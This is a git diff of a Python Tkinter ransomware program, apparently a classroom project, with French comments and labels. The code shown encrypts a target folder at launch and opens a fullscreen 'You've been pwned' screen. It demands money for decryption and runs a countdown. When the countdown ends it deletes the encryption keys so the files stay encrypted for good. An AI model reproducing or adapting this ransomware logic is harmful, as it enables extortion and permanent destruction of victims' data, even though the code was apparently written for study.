@@ -28,9 +28,12 @@ def countdown(count):
     hour = int(hour)
     minute = int(minute)
     second = int(second)
-
     label['text'] ='{}:{}:{}'.format(hour, minute, second)
 
+#Traitement du timer: dès lors que l'on arrive à 00:00:00, on exécute le code situé dans le "elif" final:
+###Suppression du bouton permettant le déchiffrement des données
+###Suppression des clés
+###Apparition du bouton permettant de quitter le programme sans offrir le déchifrement
     if second >= 0 or minute > 0 or hour > 0:
         if second > 0:
             second -= 1
@@ -50,11 +53,11 @@ def countdown(count):
             os.remove(publicKey)
             buttonQuit.pack()
             
-#Génération d'une paire de clés et chiffrement des fichiers du répertoire cible
+#Au lancement de main.py on génère une paire de clés et on chiffre directement le répertoire cible défini dans variable.py
 keygen.generate_pair()    
 encryptFolder()
 
-#Création de la fenêtre TkInter et des éléments la composant
+#Création de la fenêtre TkInter et des éléments la composant: boutons, timer, labels,...
 root = tk.Tk()
 root.title("You've been pwned !")
 root.attributes('-fullscreen', True)
@@ -63,13 +66,13 @@ label1 = tk.Label(root, text='Vous vous êtes fait pirater !', font=('calibri', 
 label1.pack()
 label2 = tk.Label(root, text='Suppression des clés de chiffrement dans:', font=('calibri', 25, 'bold'))
 label2.pack()
-label = tk.Label(root,font =('calibri', 50, 'bold'), fg='white',bg='blue')
+label = tk.Label(root,font =('calibri', 40, 'bold'), fg='white',bg='red')
 label.pack()
 label3 = tk.Label(root, text="Pour déchiffrer vos données, envoyez de l'argent à François Brille et cliquez sur \"Déchiffrer\"", font=('calibri', 13, 'bold'))
 label3.pack()
 button = tk.Button(root, text ='Déchiffrer', command=lambda : [decryptFolder(),root.quit()])
 button.pack()
-label4 = tk.Label(root, text='Notes pour le prof: Si ce programme est lancé sur votre machine personnelle, cliquez immédiatement sur Déchiffrer:', font=('calibri', 10, 'bold'))
+label4 = tk.Label(root, text='Notes: si ce programme est lancé sur votre machine personnelle, cliquez immédiatement sur Déchiffrer:', font=('calibri', 10, 'bold'))
 label4.pack()
 buttonQuit = tk.Button(root, text= 'Quitter', command=lambda : [print("Bye, enjoy your forever encrypted files"),root.quit()])
 
